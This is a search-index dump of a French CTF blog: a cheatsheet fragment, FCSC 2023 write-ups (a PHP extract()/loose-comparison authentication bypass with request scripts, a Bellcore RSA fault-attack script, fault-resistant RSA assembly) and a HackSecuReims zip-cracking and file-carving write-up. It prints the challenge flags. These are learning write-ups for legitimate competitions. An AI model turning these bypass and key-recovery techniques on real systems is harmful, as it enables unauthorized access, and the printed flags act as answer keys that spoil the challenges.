~/pwndbg/gdbinit.py -q ' alias gef='gdb -x ~/.gdbinit-gef.py -q ' alias gdb-peda='gdb -x ~/peda/peda.py' ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:5","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"ARM https://www.acmesystems.it/arm9_toolchain https://0x90909090.blogspot.com/2014/01/how-to-debug-arm-binary-under-x86-linux.html Compiler : arm-linux-gnueabihf-gcc -fno-pie -ggdb3 -no-pie -o hello_world hello_world.c Exécuter : qemu-arm -L /usr/arm-linux-gnueabihf -g 1234 ./hello_world Reverser : gdb-multiarch -q --nh \\ -ex 'set architecture arm' \\ -ex 'set sysroot /usr/arm-linux-gnueabihf' \\ -ex 'file hello_world' \\ -ex 'target remote localhost:1234' \\ -ex 'break main' \\ -ex continue \\ -ex 'layout split' ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:6","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"MIPS https://pr0cf5.github.io/ctf/2019/07/16/mips-userspace-debugging.html ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:7","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"RiscV https://danielmangum.com/posts/risc-v-bytes-qemu-gdb/#installing-tools ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:8","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Bytecode / Outils spécifiques Python: uncompyle Java: jadx Android: jadx, apktool, adb Rust: https://github.com/h311d1n3r/Cerberus Unity: https://github.com/imadr/Unity-game-hacking#unity-game-folder-structure ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:9","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Web ","date":"2023-07-10","objectID":"/posts/cheatsheet/:13:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://owasp.org/www-community/Source_Code_Analysis_Tools Payload all the things Hacktricks PayloadBox GraphQL https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/ https://ivangoncharov.github.io/graphql-voyager/ SQLi https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/ PHP Type Juggling https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf Eval https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/ SSRF https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/ https://www.dailysecurity.fr/server-side-request-forgery/ XXE https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity CSRF https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection XSS https://beta.hackndo.com/attaque-xss/ https://excess-xss.com/ https://learn-cyber.net/article/Self-XSS-Attacks https://learn-cyber.net/article/Reflected-XSS-Attacks https://www.nzeros.me/2023/08/07/securinetsminictf2k22/ https://mizu.re/tag/FCSC2023 ","date":"2023-07-10","objectID":"/posts/cheatsheet/:13:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Extensions Hacktools Wappalyzer ","date":"2023-07-10","objectID":"/posts/cheatsheet/:13:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Tools Burp (Hackvertor, JWT, Param Miner) Jwt_tool Beeceptor CSP Evaluator Gopherus RSS Validator Tplmap Wayback machine , https://archive.md/ (web archive par mots clés \u0026 copie de sites) ","date":"2023-07-10","objectID":"/posts/cheatsheet/:13:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Web3 ","date":"2023-07-10","objectID":"/posts/cheatsheet/:14:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://beta.hackndo.com/blockchain/ https://docs.soliditylang.org/en/v0.8.20/ https://ethereum.org/en/developers/docs/ https://cypherpunks-core.github.io/ethereumbook/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:14:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Pour aller plus loin ","date":"2023-07-10","objectID":"/posts/cheatsheet/:15:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Ressources générales https://www.youtube.com/@Computerphile https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/ https://hide01.ir/ https://github.com/akr3ch/BugBountyBooks ","date":"2023-07-10","objectID":"/posts/cheatsheet/:15:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Chaines 13Cubed John Hammond IppSec LiveOverflow Xct ","date":"2023-07-10","objectID":"/posts/cheatsheet/:15:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"CTF 24h/24, 7j/7 https://fuzzy.land/challenges ","date":"2023-07-10","objectID":"/posts/cheatsheet/:15:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Notes utiles en CTF voire + https://cheatsheet.haax.fr/ https://exploit-notes.hdks.org/ https://notes.vulndev.io/wiki ","date":"2023-07-10","objectID":"/posts/cheatsheet/:15:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["writeup"],"content":"Writeup","date":"2023-05-06","objectID":"/posts/salty/","tags":["web"],"title":"FCSC 2023 - Salty Auth","uri":"/posts/salty/"},{"categories":["writeup"],"content":"Enonce Le lien nous redirige directement ici: On va devoir vérifier les 2 conditions afin de pouvoir afficher le flag. ","date":"2023-05-06","objectID":"/posts/salty/:1:0","tags":["web"],"title":"FCSC 2023 - Salty Auth","uri":"/posts/salty/"},{"categories":["writeup"],"content":"Conditions Résolution Nous devons: Trouver la longueur du mot de passe Générer une collision entre fnv164(password) == fn16v4(hostname+salt) ","date":"2023-05-06","objectID":"/posts/salty/:2:0","tags":["web"],"title":"FCSC 2023 - Salty Auth","uri":"/posts/salty/"},{"categories":["writeup"],"content":"Longueur du password Si l’on fournit en GET un parametre ?password=test les comparaisons échouent et le même code source est affiché. Voici un petit script pour trouver la longueur: import requests, time url = \"https://salty-authentication.france-cybersecurity-challenge.fr/?password=\" params_template = {\"password\": \"\"} #$salt = bin2hex(random_bytes(12)); # 24 chars minimum pour secret for i in range(24, 40): params = params_template.copy() response = requests.get(url+'a'*i) time.sleep(0.2) if \"highlight_file\" not in response.text: print(i) Nous trouvons une longueur de 36. Bien, toutefois le salt inconnu est bien embêtant … On pourrait bruteforcer pendant des heures avec ce genre de script mais c’est interdit: import sys import requests import time if len(sys.argv) \u003c 2: print(\"Usage: python solve.py \u003cpass\u003e\") sys.exit() password = sys.argv[1] i = 0 while True: response = requests.get(f'https://salty-authentication.france-cybersecurity-challenge.fr/?password={password}') print(response.text) if \"Wrong\" not in response.text: break time.sleep(0.33) print(\"essai n° \", i) i+=1 ","date":"2023-05-06","objectID":"/posts/salty/:3:0","tags":["web"],"title":"FCSC 2023 - Salty Auth","uri":"/posts/salty/"},{"categories":["writeup"],"content":"Leak du hostname via phpinfo() ? Le principal souci pour vérifier la 2nde condition est que nous ne connaissons ni hostname, ni salt. Nous allons trouver hostname, vous verrez l’utilité dans la partie suivante. En me repenchant dessus j’ai trouvé une vulnérabilité: on peut appeler une certaine fonction log_attack lors de l’exit(): log_attack=phpinfo //le serveur éxécute: exit($log_attack) Et récupérer le hostname: ","date":"2023-05-06","objectID":"/posts/salty/:4:0","tags":["web"],"title":"FCSC 2023 - Salty Auth","uri":"/posts/salty/"},{"categories":["writeup"],"content":"Réinitialisation du salt via extract() Une fonction saute au yeux dans ce code, à quoi sert-elle? $salt = bin2hex(random_bytes(12)); extract($GET); $secret = gethostname().$salt; Ici réside ce qui nous permettra d’outrepasser la 2nde condition. On trouve rapidement quelques ressources sur extract: https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md https://davidnoren.com/post/php-extract-vulnerability/ PHP has a function named extract() to take all provided GET and POST requests and assign them to internal variables. Developers will, at times, use this function instead of manually assigning $_POST[var1] to $var1. This function will overwrite any previously defined variables, including server variables. Ici nous allons par la register global $SERVER. En échouant la vérification nous allons pouvoir écraser le variable salt. Grâce à extract on peut: préciser notre password écraser le salt afin de contrôler la loose comparison. Loose Comparison 0e1234 == 0e4321 == 0 On remarque tout de suite la 2nde condition if (hash('fnv164', $password) == hash('fnv164', $secret)): Voici un script permettant de trouver un password de 36 caractères pour forcer une Loose comparison \u003c?php $counter =0; while(1){ $p = bin2hex(random_bytes(18)); $counter+=1; if (hash('fnv164',$p)==0) { $h = hash('fnv164',$p); echo $p; echo \"\\n\"; echo $h; echo \"\\n\"; echo $counter; exit(); } } ?\u003e Résumons: hostname = \"9be4a60f645f\"; password = \"9be4a60f645fa74b424f8617e4d9fccfd023\"; password2 = \"9be4a60f645f\".\"b39ea06afe7bc4f917472748\"; /* https://salty-authentication.france-cybersecurity-challenge.fr/?password=\u003cpassword\u003e \u0026log_attack=extract($_SERVER);\u0026salt=\"b39ea06afe7bc4f917472748\" */ $salt = \"????????????????????????\"; //extract($GET) $salt = \"b39ea06afe7bc4f917472748\"; //1ère condition $secret = \"9be4a60f645f\".\"b39ea06afe7bc4f917472748\" //===$password2 //password != password2 //2nde condition hash('fnv164',$password) === 0e58654062616816 == 0 hash('fnv164',$secret) === hash('fnv164',$password2) == 00e9125834043228 == 0 Tada!! ","date":"2023-05-06","objectID":"/posts/salty/:5:0","tags":["web"],"title":"FCSC 2023 - Salty Auth","uri":"/posts/salty/"},{"categories":null,"content":"Hugo, the world's fastest framework for building websites","date":"2023-05-05","objectID":"/about/","tags":null,"title":"À Propos","uri":"/about/"},{"categories":null,"content":"Passionné d’infosec Vous pouvez me retrouver sur Root Me, Cryptohack, TryHackMe et bientôt HackTheBox ","date":"2023-05-05","objectID":"/about/:1:0","tags":null,"title":"À Propos","uri":"/about/"},{"categories":null,"content":"Étudiant En école d’ingénieur. ","date":"2023-05-05","objectID":"/about/:2:0","tags":null,"title":"À Propos","uri":"/about/"},{"categories":["writeup"],"content":"Writeup","date":"2023-05-05","objectID":"/posts/smthg_wrong/","tags":["crypto"],"title":"FCSC 2023 - Quelque chose cloche","uri":"/posts/smthg_wrong/"},{"categories":["writeup"],"content":"Intro Le FCSC est un CTF de type “jeopardy”, avec cette année une soixantaine d’épreuves de difficultés variées dans les catégories suivantes : crypto, reverse, pwn, web, forensics, hardware, attaque par canaux auxiliaires ou en faute et misc. La catégorie Side channel était particulièrement intéressante car elle proposait ce challenge d’attaque par fautes, ainsi que 2 challenges de défense (voir post suivant). ","date":"2023-05-05","objectID":"/posts/smthg_wrong/:1:0","tags":["crypto"],"title":"FCSC 2023 - Quelque chose cloche","uri":"/posts/smthg_wrong/"},{"categories":["writeup"],"content":"Signature Voici ce que donne une première connexion au serveur utilisant l’implémentation décrite. $$s = m^{d}[n]$$ $$m = s^{e}[n]$$ Nous avons à la fin s qui sera notée par la suite s': la signature erronée calculée par le serveur. Nous ne pouvons malheureusement pas signer m = 1 car cela nous donnerait dp et dq et on pourrait factoriser n directement. Le but est de retrouver la clé privée d afin de déchiffrer le ciphertext c, sachant que la paire ((n,e),d) change à chaque éxécution. Ainsi, nous pourrons récupérer le flag $$ m = c^{d} [n]$$ ","date":"2023-05-05","objectID":"/posts/smthg_wrong/:2:0","tags":["crypto"],"title":"FCSC 2023 - Quelque chose cloche","uri":"/posts/smthg_wrong/"},{"categories":["writeup"],"content":"Résolution Énorme coup de chance, la doc que j’avais cherché pour RSA - Secure dev (avec google sur RSA-CRT : iq,dp,dq) donne la solution … Théorème de Bezout L’algorithme d’Euclide étendu (egcd) permet de trouver les coefficients de Bezout, tels que ap + bq = 1 D’après l’énoncé nous avons: La signature calculée avec le théorème des Restes Chinois (CRT) vaut, avec $$i_{q}= q^{-1} [p]$$ RSA et Théorème des Restes Chinois (CRT) Le Théorème des Restes Chinois (CRT) est souvent utilisé pour optimiser le déchiffrement RSA en découpant les calculs en sous-problèmes. Version Équations Modulaires : Dans le contexte de RSA, supposons que nous ayons un message $m$ chiffré $c$ et les modules de chiffrement $N_1, N_2, \\ldots, N_k$. Calculons les $M_i$ et les coefficients d’inversion $y_i$ pour chaque $i$ de $1$ à $k$. Ensuite, en utilisant le CRT, la valeur déchiffrée $x$ est donnée par : $$ m = (c_1 \\cdot M_1 \\cdot y_1 + c_2 \\cdot M_2 \\cdot y_2 + \\ldots + c_k \\cdot M_k \\cdot y_k) \\ (\\mathrm{mod} \\ N), $$ où $N = N_1 \\cdot N_2 \\cdot \\ldots \\cdot N_k$. Si vous ne me croyez pas ,c’est dans ce document ! https://www.cosade.org/cosade19/cosade14/presentations/session2_b.pdf On chiffre donc un message au hasard et on retrouve q avec la seconde méthode. ","date":"2023-05-05","objectID":"/posts/smthg_wrong/:3:0","tags":["crypto"],"title":"FCSC 2023 - Quelque chose cloche","uri":"/posts/smthg_wrong/"},{"categories":["writeup"],"content":"Explication: On dispose de s' lorsque le serveur répond: la signature erronée. Notons s la vraie signature. D’où: $${s’}^{e}[n] - {s}^{e}[n] = {s’}^{e}[n] - m $$ Notons $$\\delta = {s’}^{e}[n] - m$$ Nous avons un diviseur commun avec n: $$\\delta \\wedge n != 1$$ C’est l’attaque de Bellcore: https://eprint.iacr.org/2012/553.pdf ","date":"2023-05-05","objectID":"/posts/smthg_wrong/:4:0","tags":["crypto"],"title":"FCSC 2023 - Quelque chose cloche","uri":"/posts/smthg_wrong/"},{"categories":["writeup"],"content":"Script Voici le script qui déroule le tout (~1min) from Crypto.Util.number import * c = 8691197749172883783999869319789618890520358126730965200409107370406064006554707505526767161587301532065491886972275903119359532224155354711599130564106144366948103345871831367224426653157094635446381023887990673145477148254742543979935423430776801169055293926445308619472525852943150307661555159608768287631493213019746321573545268091668284963786935853060372774005089483981288875382272937192397700293917020390318315789877283735790900752923209438049279405774089645062273480481195015428987016044959021859352466587859781412088053020118565976357288819878740642165202640596496277942263686968322614760892708394999372377621 m= 3 e = 65537 n = 24092374789898986578319635371648583476600439980337391802703575171857047857157186973589469738598524717467164271258524540616489429272356655174441100779924597091596548506254118920820210014644431581384405741516669846658564893995651994762800981386922622678935264425704567649579129898359460699450083897199747662224532807410886207560447847040297950285025366888583965843432420598518599758119380366544661227909107904202708759769118310010571214615993018135335528945098609588994340874276412541272457264153891261421840299789040416900179377675966523068321023529010524806340701046933963675795872266981575283250285335962694350991853 s = 20109988724347546331933605448539189098587356370928424422747391760423348033837002382899144867015623947899225239174121508108964869874084077980733407484134630342553200036338033461936360491648367626929205539308993531597452037787078623386137499111851588812516907869339483119834320843616385692595133368269569563861312004891486728823683445280930052977845947831259726828558951682588647370285446054725025235049702759513984865144840917884384544713971675994868300767458293324544539118039497009305075085631896683868510719263064259519980588228257267310609908804987070071356193781043867179142394219429108905455352626283232027985695 q = GCD(s**e-m,n) p = n//q phi = (p-1)*(q-1) d = pow(e,-1,phi) m = pow(c,d,n) print(long_to_bytes(m)) FCSC{1ec0d4b4c2de4329e2431fb65d229fb7ba2fbf93206e8c273ca22172bdb64d99} ","date":"2023-05-05","objectID":"/posts/smthg_wrong/:5:0","tags":["crypto"],"title":"FCSC 2023 - Quelque chose cloche","uri":"/posts/smthg_wrong/"},{"categories":["writeup"],"content":"Writeup","date":"2023-05-05","objectID":"/posts/rsa/","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Enonce Poursuivons notre lancée sur RSA. Ici nous allons nous intéresser aux mécanismes permettant de calculer une signature avec de bonnes performances et avec un code sûr. En effet comme mentionné dans le précédent post nous allons devoir non plus mettre en place mais résister à une attaque par fautes. Cette série de 3 challenges avait pour particularité de faire partie des 5 challenges utilisant la machine virtuelle du FCSC. machine.py : le fichier Python évaluant les instructions de cette machine. assembly.py : un assembleur décrit plus bas. rsa_keygeneraton.py : un générateur de clés aléatoire challenge.py : le fichier du challenge Ce dernier contenait notamment une vérification de notre bytecode def easy(code): correctness(code) performances(code) flag_easy = open(\"flag_easy.txt\").read().strip() print(f\"[+] Congrats! Here is the easy flag: {flag_easy}\") Nous devions implémenter un compilateur pour traduire les problèmes avec le langage assembleur fourni (proche d’ARM) en bytecode: from assembly import assembly source=\"\" def compile(code): global source source = code z = assembly(code.upper().split('\\n')) print(code) print(\"[\",z,\"]\") return z.encode() def stub(): code = f\"\"\" ; la machine est initialisée comme suit ; R5 = m ; R6 = p ; R7 = q ; R8 = iq = q**(-1) % p ; R9 = dp = e**(-1) % p-1 ; RA = dq = e**(-1) % q-1 ; RB = e ; RC = d ; RD = n //CODE ; R0 doit contenir le résultat STP \"\"\" return compile(code) stub() ","date":"2023-05-05","objectID":"/posts/rsa/:1:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Méthode(s) naïve(s) On peut penser à exploiter l’instruction POW déjà présente. Cependant la contrainte de performance n’est pas vérifiée: Oubliez tout de suite l’ exponentiation rapide \"maison\", les performances sont désastreuses: POW était donc bien nécessaire mais comment faire mieux? ","date":"2023-05-05","objectID":"/posts/rsa/:2:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Optimisation avec iq En faisant une recherche, curieux de disposer dans les registres de iq, dp et dq on tombe sur ceci: https://www.cosade.org/cosade19/cosade14/presentations/session2_b.pdf On peut découper le travail en calculant l’exponentiation sur p et q de tailles bien plus petites. Tout ceci tient au théorème des restes chinois: Déchiffrement RSA avec le Théorème des Restes Chinois (CRT) Le déchiffrement RSA avec le Théorème des Restes Chinois (CRT) est une méthode optimisée pour chiffrer et déchiffrer un message. Ce processus implique le calcul de $m$ à partir des valeurs intermédiaires $c_p$ et $c_q$, où $c_p = c^{d_p} \\ (\\mathrm{mod} \\ p)$ et $c_q = c^{d_q} \\ (\\mathrm{mod} \\ q)$. Étapes : Calcul des coefficients d’inversion : Calculer $q_{inv}$ tel que $q_{inv} \\equiv q^{-1} \\ (\\mathrm{mod} \\ p)$, c’est-à-dire que $q \\cdot q_{inv} \\equiv 1 \\ (\\mathrm{mod} \\ p)$. Calcul des composantes CRT : Calculer $m_p = c_q \\cdot q_{inv} \\ (\\mathrm{mod} \\ p)$. Calculer $m_q = c_p \\cdot p_{inv} \\ (\\mathrm{mod} \\ q)$, où $p_{inv}$ est le coefficient d’inversion de $p$ modulo $q$. Calcul de la solution $m$ : Calculer $h = q_{inv} \\cdot (m_p - m_q) \\ (\\mathrm{mod} \\ p)$. Calculer $m = m_q + h \\cdot q$. Le résultat $m$ correspond au message déchiffré. Ce processus profite de la propriété du Théorème des Restes Chinois (CRT) pour optimiser le calcul en divisant les opérations modulo $N$ en opérations modulo $p$ et modulo $q$, ce qui accélère le déchiffrement RSA. Attention à certaines spécifités: RD doit contenir le modulo de l’opération (MOD ou POW) , RC : l’exposant (d, p ou q) MUL ne peut opérer que sur R[0-7] ; R5 = m ; R6 = p ; R7 = q ; R8 = iq = q**(-1) % p ; R9 = dp = e**(-1) % p-1 ; RA = dq = e**(-1) % q-1 ; RB = e ; RC = d ; RD = n ; dp en exp ; p en mod MOV RC, R9 MOV RD, R6 POW R1, R5 ;s1 = m**dp %p ; dq en exp ; q en mod MOV RC, RA MOV RD, R7 POW R2, R5 ;s2 = m**dp %q ; p en mod ; s1-s2 dans R3 ; iq*(s1-s2) dans R4 ; h = iq*(s1-s2) %p dans R0 MOV RD, R6 SUB R3, R1, R2 MOV R4, R8 MUL R3, R4, R3 ;ATTENTION : R[0-7] pour MUL MOD R3, R3 ; s2 + hq dans R0 MUL R1, R3, R7 ADD R0, R2, R1 STP Congrats! Here is the easy flag: FCSC{06de1084d295f2a016f79485f2a47744bfb9ed3e30e9312121665559df9447de} RSA 2/3 Ainsi nous avons implémenté dans un premier temps RSA - CRT: https://www.di-mgt.com.au/crt_rsa.html . Toutefois notre implémentation sera vulnérable aux attaques comme vu dans le précédent post. Ceci ne marche donc pas pour le 2nd test. ","date":"2023-05-05","objectID":"/posts/rsa/:3:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Résolution On reprend cette doc : https://www.cosade.org/cosade19/cosade14/presentations/session2_b.pdf L’idée est d’utiliser un facteur aléatoire dans la signature RSA. On teste en python voir si ça marche: r = 2371 #rand q = 17 m = 3 p = 19 e = 65537 phi = (p-1)*(q-1) d = pow(e,-1,phi) n = p*q dp = pow(e,-1,p-1) dq = pow(e,-1,q-1) #algo q_prim = (q*r)%p q1 = m*pow(q_prim,e-2,p) q2 = q1*pow(q_prim,2,p) s1_p = (q1*pow(q2,dp-1,p))%p p_prim = (p*r)%q p1 = m*pow(p_prim,e-2,q) p2 = p1*pow(p_prim,2,q) s1_q = (p1*pow(p2,dq-1,q))%q s = (p*s1_q + q*s1_p)%n print(pow(r*s,e,n)%n) print(m) # On veut r*s%n print(\"signature oberthur:\", r*s%n) print(\"signature classique:\",pow(m,d,n)) Vient l’implémentation en asm …: ; R5 = m ; R6 = p ; R7 = q ; R8 = iq = q**(-1) % p ; R9 = dp = e**(-1) % p-1 ; RA = dq = e**(-1) % q-1 ; RB = e ; RC = d = exp ; RD = n = module MOV R1, #200 ;r ;partie 1: s1_p ;q_prim = (q*r)%p MUL R2, R7, R1 MOV RD, R6 MOD R2, R2 ;q1 = m*pow(q_prim,e-2,p) MOV R0, RB MOV R3, #2 SUB R0, R0, R3 MOV RC, R0 POW R3, R2 MUL R3, R3, R5 ;q2 = q1*pow(q_prim,2,p) MOV RC, #2 POW R4, R2 MUL R4, R4, R3 ;s1_p = q1*pow(q2,dp-1,p) MOV R0, #1 MOV R2, R9 SUB R0, R2, R0 ; R0 = dp -1 MOV RC, R0 POW R0, R4 MUL R0, R0, R3 ; R0 = s1_p !!! ;partie 2: s1_q ; NE PAS ECRASER: R0,R1,R5,R6,R7 ;p_prim = (p*r)%q MUL R2, R6, R1 MOV RD, R7 MOD R2, R2 ;p1 = m*pow(p_prim,e-2,q) MOV R4, RB MOV R3, #2 SUB R3, R4, R3 MOV RC, R3 POW R3, R2 MUL R3, R3, R5 ;p2 = p1*pow(p_prim,2,q) MOV RC, #2 POW R4, R2 MUL R4, R4, R3 ;s1_q = p1*pow(p2,dq-1,q) MOV R5, #1 MOV R2, RA SUB R5, R2, R5 ; R5 = dq -1 MOV RC, R5 POW R2, R4 MUL R2, R2, R3 ; R2 = s1_q !!! ;s = (p*s1_q + q*s1_p)%n ; NE PAS ECRASER: R0,R1,R2,R6;R7 MUL R3, R6, R2 MUL R4, R7, R0 ADD R3, R3, R4 MUL R0, R6, R7 ;n dans RD MOV RD, R0 MOD R3, R3 ; s dans R3 ;r*s%n MUL R0, R1, R3 MOD R0,R0 STP Ce code est correct, performant mais ne résiste pas à l’attaque. ","date":"2023-05-05","objectID":"/posts/rsa/:4:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Principe du verrou Il existe en effet de nombreuses façons d’injecter une telle faute: corrompre en mémoire, sauter une instruction dans l’exponentiation, corrompre le résultat de l’exponentiation, corrompre le message à signer Comme vu précédemment, une signature erronée + une signature valide permettent de retrouver la clé privée … En notant s et s' respectivement la signature attendue et erronnée (à cause de l’attaque), nous devions vérifier que s = pow(m,e,n) (sans utiliser R0 jusque là) et écraser les registres sinon. Inputs: res, s, s' Output: res if s == s', erase everything otherwise IF s != s' THEN ERASE out = res IF s != s' THEN ERASE RETURN out Ce qui peut s’implémentee comme ceci : ;RSA reencryption in R0 ; RC = e MOV RC, RB POW R0, R1 ; check against original message to avoid fault attacks CMP R0, R5 JNZA ko MOV R0, R1 STP ko: XOR R0, R0, R0 STP Ce code permettait de résoudre le problème: ; R2 = Sq MOV RD, R7 ; RD = q MOV RC, RA ; RC = dq POW R2, R5 ; m^dq % q ; R1 = Sp MOV RD, R6 ; RD = p MOV RC, R9 ; RC = dp POW R1, R5 ; m^dp % p ; R1 = (Sp - Sq)Iq mod p MOV R4, R8 ; R4 = Iq SUB R1, R1, R2 ; Sp - Sq MUL R1, R1, R4 ; * Iq MOD R1, R1 ; % p ; R1 = R1*q + Sq mod N MUL R4, R6, R7 ; R4 = N MOV RD, R4 ; RD = N MUL R1, R1, R7 ; * q ADD R1, R1, R2 ; + Sq MOD R1, R1 ; % N ; Check signature correctness MOV RC, RB ; RC = e POW R2, R1 ; R2 = s^e % N ; Lock principle CMP R2, R5 ; R2 ? m JNZA erase MOV R0, R1 ; R0 = s CMP R2, R5 ; R2 ? m JZA end erase: MOV R0, RF MOV R1, RF MOV R2, RF MOV R3, RF MOV R4, RF MOV R5, RF MOV R6, RF MOV R7, RF MOV R8, RF MOV R9, RF MOV RA, RF MOV RB, RF MOV RC, RF MOV RD, RF end: STP Congrats! Here is the medium flag: FCSC{3704721831edcd9f4cd231eb45a4880ea7af6962c358af355130d6881c155479} ","date":"2023-05-05","objectID":"/posts/rsa/:5:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"RSA 3 Apparemment, il fallait éviter d’utiliser R0, une des fautes consistait à insérer un code STP après chaque instruction possible … ","date":"2023-05-05","objectID":"/posts/rsa/:6:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Conclusion Cette série était très intéressante et m’a permis de me familiariser à l’assembleur avec une petite nuit de débug, ainsi que de me sensibiliser aux attaques par fautes sur RSA - CRT, aussi bien du côté de l’attaquant que du défenseur sur cette partie. ","date":"2023-05-05","objectID":"/posts/rsa/:7:0","tags":["hardware","crypto"],"title":"FCSC 2023 - RSA Secure Dev","uri":"/posts/rsa/"},{"categories":["writeup"],"content":"Writeup","date":"2023-04-17","objectID":"/posts/secret_key/","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"},{"categories":["writeup"],"content":"Intro HSR est l’un des toutes premiers évènements dédiés aux étudiants français. Cette année, pour la 6ème édition, nous étions 150 pour le CTF. Voici pour commencer un défi sympa que j’ai eu l’occasion de faire au HackSecuReims. Nous avons une image secret.png un peu lourde, l’énoncé nous dit que le flag se situera à côté d’une mention ‘passwd’. ","date":"2023-04-17","objectID":"/posts/secret_key/:1:0","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"},{"categories":["writeup"],"content":"Extraction zip On extrait donc son contenu: binwalk -e secret.png On obtient un zip, qu’on essaie de dézipper avec 7zip au vu de la version, mais protégé par mot de passe: ","date":"2023-04-17","objectID":"/posts/secret_key/:2:0","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"},{"categories":["writeup"],"content":"Crack avec john On utilise zip2john pour donner à john le hash du mot de passe sous un format qu’il connaît. On le casse avec john, le mot de passe est icecream. Le dossier secret extrait nous révèle un fichier mysecrets.001: ","date":"2023-04-17","objectID":"/posts/secret_key/:3:0","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"},{"categories":["writeup"],"content":"Inspection du disque Le fichier est en fait un disque logique DOS/MBR. Pour le monter dans un dossier tmp, on effectue un fdisk -l afin de connaître le début et la taille de chaque secteur. On utilise mount, mais à part des photos de chats, rien d’intéressant. ","date":"2023-04-17","objectID":"/posts/secret_key/:4:0","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"},{"categories":["writeup"],"content":"Récupération de fichiers effacés En pratique j’avais sauté l’étape précédente. On peut utiliser photorec (paquet testdisk) pour faire du file carving: ","date":"2023-04-17","objectID":"/posts/secret_key/:5:0","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"},{"categories":["writeup"],"content":"Flag Un dossier recupdir apparaît avec une image: C’est le flag! ","date":"2023-04-17","objectID":"/posts/secret_key/:6:0","tags":["forensic","misc"],"title":"HackSecuReims 2023 - secret key","uri":"/posts/secret_key/"}]